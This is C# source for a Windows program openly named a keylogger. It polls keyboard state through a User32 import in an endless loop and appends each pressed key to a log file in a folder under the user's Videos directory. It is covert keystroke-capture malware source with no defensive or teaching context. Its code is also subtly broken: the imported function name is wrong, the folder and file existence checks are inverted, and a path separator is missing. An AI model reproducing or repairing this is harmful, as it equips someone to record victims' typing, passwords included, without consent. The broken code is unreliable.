using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Windows.Forms;
namespace Keylogger3
{
    static class Program
    {
        [DllImport("User32.dll")] // Import user dll
        private static extern int GetAsyncAwaitState(int i);
        static void Main(string[] args)
        {
            logs();
            Console.ReadLine();
        }



        static void logs()
        {
            var filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos); // Your file path
            filepath += @"\logsfolder"; // folder file

            if (Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);

                
            }

            var path = (@filepath + "logskey.text"); // Your file name
            if (File.Exists(path))
            {
                using (var sw = File.CreateText(path))
                {

                }
                 var converter = new KeysConverter();
                 var text = "";

                 while (5 > 1)
                 {
                     Thread.Sleep(5);
                     for (var i = 0; i < 2000; i++)
                     {
                         var key = GetAsyncAwaitState(i);
                         if(key == 1 || key == -32767)
                         {
                             text = converter.ConvertToString(i);

                             using (var sw = File.AppendText(path))
                             {
                                 sw.WriteLine(text);
                             }
                             
                             break;
                         }
                         
                     }
                 }
            }
        }
    }
}
